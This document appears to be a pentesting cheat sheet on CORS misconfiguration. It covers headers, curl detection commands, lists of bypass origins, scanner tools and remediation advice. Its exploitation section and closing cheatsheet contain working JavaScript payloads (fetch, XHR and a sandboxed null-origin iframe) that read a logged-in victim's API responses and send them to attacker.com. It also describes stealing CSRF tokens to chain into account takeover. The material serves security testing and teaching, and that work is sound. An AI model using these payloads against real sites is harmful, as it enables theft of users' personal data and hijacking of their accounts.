# CORS Misconfiguration

Cross-Origin Resource Sharing relaxes the Same-Origin Policy so a site can expose APIs to other origins. Misconfigured CORS lets a malicious origin read authenticated responses from the victim's session — leaking PII, API keys, CSRF tokens, and enabling account takeover. The dangerous combination is **a reflected/over-permissive `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`**.

---

## Quick primer on the headers

```http
Access-Control-Allow-Origin: https://attacker.com    # who may read the response
Access-Control-Allow-Credentials: true               # cookies/auth allowed cross-origin
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, X-Custom
```

Key rule: `Access-Control-Allow-Origin: *` **cannot** be combined with credentials. So the exploitable bug is usually the server **reflecting the `Origin` header** while also allowing credentials.

---

## Detection

Send requests with a crafted `Origin` and inspect the response ACAO/ACAC headers:

```bash
# 1. Reflected origin?
curl -s -I https://TARGET/api/account -H "Origin: https://evil.com" | grep -i access-control
#   ACAO: https://evil.com  +  ACAC: true   -> VULNERABLE

# 2. null origin accepted?
curl -s -I https://TARGET/api/account -H "Origin: null" | grep -i access-control

# 3. Weak allowlist (suffix/prefix/substring matching)?
curl -s -I https://TARGET/api -H "Origin: https://target.com.evil.com" | grep -i access-control
curl -s -I https://TARGET/api -H "Origin: https://evil-target.com"     | grep -i access-control
```

---

## Vulnerable patterns & bypasses

```text
1. Reflected Origin + credentials true       -> classic, fully exploitable
2. Origin: null trusted                       -> sandboxed iframe / data: URL sends null
3. Substring/regex allowlist:
     startsWith("https://target.com")  -> https://target.com.evil.com
     endsWith("target.com")            -> https://eviltarget.com
     contains("target.com")            -> https://target.com.evil.com / evil.com?target.com
4. Trusts all subdomains (*.target.com)       -> take over/XSS any subdomain -> read API
5. Trusts http:// origins                      -> MITM on http subdomain -> forge Origin
6. Pre-domain wildcard / dev origins left in   -> localhost, *.dev, staging
```

```text
# Origins to test
https://target.com.evil.com
https://eviltarget.com
https://target.com\.evil.com
https://target.com%60.evil.com        (some parsers)
http://target.com                     (downgrade)
null
https://sub.target.com                (if any subdomain is attacker-controllable)
```

---

## Exploitation

### 1. Read authenticated data (reflected origin + credentials)

Host this on `attacker.com`; when a logged-in victim visits, it reads their data and exfiltrates it:

```html
<script>
fetch('https://TARGET/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/log?d=' + encodeURIComponent(d)));
</script>
```

Or classic XHR form:

```html
<script>
var x = new XMLHttpRequest();
x.onload = function(){ location='https://attacker.com/?d='+encodeURIComponent(this.responseText); };
x.open('GET','https://TARGET/api/account/details',true);
x.withCredentials = true;
x.send();
</script>
```

### 2. `Origin: null` exploitation

If the server reflects/trusts `null`, deliver the request from a sandboxed iframe (its origin is `null`):

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    fetch('https://TARGET/api/key',{credentials:'include'})
      .then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+encodeURIComponent(d)));
  &lt;/script&gt;">
</iframe>
```

### 3. Steal CSRF token → chain to CSRF/ATO

Read a page/endpoint that contains the anti-CSRF token, then submit a state-changing request — turning a "harmless" CORS bug into account takeover.

### 4. Subdomain trust → pivot

If CORS trusts `*.target.com` and you find XSS or a takeover on any subdomain, host the exfil script there and read the main app's authenticated API.

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Suite** (manual + scanner) | Inject Origin, observe ACAO/ACAC; build PoC |
| **CORScanner** | Fast misconfig scanner across many bypass payloads |
| **Corsy** | CORS misconfiguration scanner (reflected/null/regex/etc.) |
| **nuclei** | `-tags cors` templates |

```bash
python3 corsy.py -u https://TARGET/api/account
python3 CORScanner.py -u https://TARGET -d         # deep mode
nuclei -u https://TARGET -tags cors
```

---

## Remediation

- Maintain a strict **allowlist** of exact origins; never reflect the `Origin` header blindly.
- Never combine `Access-Control-Allow-Origin: *` with credentials, and avoid credentials cross-origin unless required.
- Do not trust `null` origin.
- Match origins exactly (full scheme+host+port); avoid `startsWith`/`endsWith`/`contains` checks and unescaped regex (`.` matches any char).
- Don't trust all subdomains; treat every subdomain as a potential foothold.
- Keep sensitive data out of CORS-enabled endpoints; require non-cookie auth (bearer) so a victim's session can't be ridden.

---

## Cheatsheet

```text
# Detect
curl -I https://T/api -H "Origin: https://evil.com" | grep -i access-control
# Vulnerable if: ACAO reflects evil.com AND ACAC: true
# Bypass origins
https://target.com.evil.com   https://eviltarget.com   null   http://target.com
# Exploit (reflected + creds)
fetch('https://T/api/account',{credentials:'include'}).then(r=>r.text())
  .then(d=>fetch('https://attacker/?d='+encodeURIComponent(d)))
# null origin
<iframe sandbox="allow-scripts" srcdoc="<script>fetch(...)</script>">
```

---

## References

- PortSwigger — CORS: https://portswigger.net/web-security/cors
- PortSwigger — Exploiting CORS misconfigurations: https://portswigger.net/web-security/cors/access-control-allow-origin
- PayloadsAllTheThings — CORS: https://swisskyrepo.github.io/PayloadsAllTheThings/CORS%20Misconfiguration/
- HackTricks — CORS bypass: https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
- OWASP — HTML5 Security Cheat Sheet (CORS): https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- Corsy: https://github.com/s0md3v/Corsy | CORScanner: https://github.com/chenjj/CORScanner
